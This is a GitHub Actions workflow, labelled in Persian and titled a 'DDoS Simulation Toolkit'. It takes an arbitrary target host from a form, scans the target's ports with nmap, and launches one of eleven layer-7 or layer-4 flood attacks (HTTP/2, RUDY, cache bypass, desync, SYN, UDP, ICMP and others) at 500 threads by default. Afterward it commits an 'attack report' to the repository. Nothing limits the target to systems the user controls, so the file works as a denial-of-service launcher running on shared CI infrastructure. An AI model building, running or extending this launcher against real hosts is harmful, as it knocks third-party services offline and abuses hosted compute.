name: Ultimate DDoS Simulation Toolkit

on:
  workflow_dispatch:
    inputs:
      attack:
        description: 'نوع حمله'
        required: true
        default: 'l7_mixed_flood'
        type: choice
        options:
          - l7_http_flood
          - l7_http2_flood
          - l7_mixed_flood
          - l7_rudy_flood
          - l7_cache_bypass
          - l7_range_flood
          - l7_desync_flood
          - l4_syn_flood
          - l4_ack_flood
          - l4_udp_flood
          - l4_icmp_flood
      target:
        description: 'آدرس هدف'
        required: true
      port:
        description: 'پورت (auto = اسکن)'
        required: true
        default: 'auto'
      duration:
        description: 'مدت حمله (ثانیه)'
        required: true
        default: '120'
      threads:
        description: 'تعداد نخ‌ها'
        required: true
        default: '500'

permissions:
  contents: write

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: نصب
        run: |
          sudo apt-get update
          sudo apt-get install -y nmap
          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
      - name: اجرا
        env:
          TARGET_HOST: ${{ github.event.inputs.target }}
          TARGET_PORT: ${{ github.event.inputs.port }}
          ATTACK_TYPE: ${{ github.event.inputs.attack }}
          DURATION: ${{ github.event.inputs.duration }}
          THREADS: ${{ github.event.inputs.threads }}
        run: |
          python3 -c "
          import os, sys, time, threading, json
          from datetime import datetime
          from pathlib import Path
          from worker_utils import *
          from all_attacks import *

          TARGET = os.environ['TARGET_HOST']
          ATTACK = os.environ['ATTACK_TYPE']
          DURATION = int(os.environ['DURATION'])
          THREADS = int(os.environ['THREADS'])
          PORT_ARG = os.environ['TARGET_PORT'].strip().lower()
          REPORT_FILE = 'attack_report.txt'

          console.print('[bold red]DDoS Simulation Toolkit[/bold red]')
          ip = resolve_target(TARGET)
          if ip is None:
              console.print('[red]❌ نمی‌تونم IP رو پیدا کنم.[/red]')
              sys.exit(1)
          console.print(f'🎯 IP هدف: [bold cyan]{ip}[/bold cyan]')

          target_ports = None
          cached_ports = get_cached_scan(ip)
          if cached_ports is not None and PORT_ARG == 'auto':
              target_ports = cached_ports
              console.print('[green]♻️ استفاده از کش.[/green]')

          if target_ports is None:
              if PORT_ARG == 'auto':
                  open_ports = discover_ports(ip, ATTACK)
                  if not open_ports:
                      console.print('[red]❌ پورتی پیدا نشد.[/red]')
                      sys.exit(1)
                  update_cache(ip, TARGET, open_ports)
                  target_ports = [p['port'] for p in open_ports]
              else:
                  target_ports = [int(os.environ['TARGET_PORT'])]

          console.print(f'🎯 پورت‌های هدف: [bold yellow]{target_ports}[/bold yellow]')
          console.print(f'⚡ نوع حمله: [bold magenta]{ATTACK}[/bold magenta]')
          console.print(f'⏱️ مدت: [bold]{DURATION}s[/bold] | 🧵 نخ: [bold]{THREADS}[/bold]\n')

          for port in target_ports:
              scheme = 'https' if port == 443 else 'http'
              base_url = f'{scheme}://{TARGET}' if port in (80, 443) else f'{scheme}://{TARGET}:{port}'
              console.print(f'[bold green]🚀 شروع حمله روی {base_url}[/bold green]')

              if ATTACK == 'l7_http_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=run_async_flood, args=(http_worker, base_url, 4))
                      t.daemon = True; t.start()
              elif ATTACK == 'l7_http2_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=run_async_flood, args=(http2_worker, base_url, 4))
                      t.daemon = True; t.start()
              elif ATTACK == 'l7_mixed_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=run_async_flood, args=(mixed_worker, base_url, 2))
                      t.daemon = True; t.start()
              elif ATTACK == 'l7_rudy_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=run_async_flood, args=(rudy_worker, base_url, 1))
                      t.daemon = True; t.start()
              elif ATTACK == 'l7_cache_bypass':
                  for _ in range(THREADS):
                      t = threading.Thread(target=run_async_flood, args=(cache_bypass_worker, base_url, 4))
                      t.daemon = True; t.start()
              elif ATTACK == 'l7_range_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=run_async_flood, args=(range_worker, base_url, 4))
                      t.daemon = True; t.start()
              elif ATTACK == 'l7_desync_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=run_async_flood, args=(desync_worker, base_url, 4))
                      t.daemon = True; t.start()
              elif ATTACK == 'l4_syn_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=syn_worker, args=(ip, port))
                      t.daemon = True; t.start()
              elif ATTACK == 'l4_ack_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=ack_worker, args=(ip, port))
                      t.daemon = True; t.start()
              elif ATTACK == 'l4_udp_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=udp_worker, args=(ip, port))
                      t.daemon = True; t.start()
              elif ATTACK == 'l4_icmp_flood':
                  for _ in range(THREADS):
                      t = threading.Thread(target=icmp_worker, args=(ip,))
                      t.daemon = True; t.start()

          stats['start_time'] = time.time()
          with Live(stats_display(), refresh_per_second=2, console=console) as live:
              end_time = time.time() + DURATION
              while time.time() < end_time:
                  time.sleep(0.5)
                  live.update(stats_display())

          stop_event.set()
          time.sleep(0.5)
          final = get_stats()
          console.print('\n[bold green]✅ حمله کاملاً متوقف شد.[/bold green]')

          success_rate = (final['success']/(final['sent'] or 1))*100
          report_lines = [
              '📊 گزارش حمله DDoS',
              '========================',
              f'🎯 هدف: {TARGET} (IP: {ip})',
              f'🔌 پورت‌های هدف: {target_ports}',
              f'⚡ نوع حمله: {ATTACK}',
              f'⏱️ مدت زمان: {DURATION} ثانیه',
              f'📤 کل بسته‌های ارسالی: {final[\"sent\"]:,}',
              f'✅ موفق: {final[\"success\"]:,}',
              f'❌ ناموفق: {final[\"failed\"]:,}',
              f'🎯 نرخ موفقیت: {success_rate:.2f}%',
              f'⚡ میانگین RPS: {final[\"rps\"]:.0f}',
              f'🕒 زمان پایان: {datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")}',
          ]
          report_content = '\n'.join(report_lines)
          with open(REPORT_FILE, 'w') as f:
              f.write(report_content)
          os.system(f'git add {REPORT_FILE} && git commit -m \"Add attack report\" && git push 2>/dev/null || true')
          console.print(f'[green]📄 گزارش حمله در {REPORT_FILE} ذخیره شد.[/green]')

          summary = Table(title='📊 گزارش نهایی', show_header=True)
          summary.add_column('متریک', style='cyan'); summary.add_column('مقدار', style='bold white')
          summary.add_row('کل ارسالی', f'{final[\"sent\"]:,}')
          summary.add_row('موفق', f'{final[\"success\"]:,}')
          summary.add_row('ناموفق', f'{final[\"failed\"]:,}')
          summary.add_row('نرخ موفقیت', f'{success_rate:.1f}%')
          summary.add_row('RPS میانگین', f'{final[\"rps\"]:.0f}')
          summary.add_row('زمان کل', f'{final[\"elapsed\"]:.1f}s')
          console.print(summary)
          "
